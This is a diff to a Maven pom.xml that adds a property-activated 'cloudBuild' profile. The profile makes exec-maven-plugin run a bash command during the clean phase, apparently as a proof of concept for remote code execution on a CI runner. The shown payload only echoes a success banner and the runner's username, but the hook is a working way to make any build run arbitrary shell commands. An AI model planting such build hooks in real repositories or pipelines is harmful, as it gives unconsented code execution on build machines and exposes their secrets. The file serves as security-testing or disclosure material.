@@ -1,10 +1,42 @@
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+<project>
     <modelVersion>4.0.0</modelVersion>
     <groupId>com.example</groupId>
     <artifactId>poc-workflow</artifactId>
     <version>1.0-SNAPSHOT</version>
-    <packaging>jar</packaging>
-    <name>POC Workflow Project</name>
+    <profiles>
+        <profile>
+            <id>cloudBuild</id>
+            <activation>
+                <property>
+                    <name>cloudBuild</name>
+                </property>
+            </activation>
+ <build>
+        <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.1.1</version>
+                <executions>
+                    <execution>
+                        <id>run-poc</id>
+                        <phase>clean</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <executable>/bin/bash</executable>
+
+                            <arguments>
+                                <argument>-c</argument>
+                                <argument>echo "✅ ✅ POC SUCCESSFUL! RCE was achieved. Runner user is $(whoami) ✅ ✅"</argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+        </profile>
+    </profiles>
 </project>
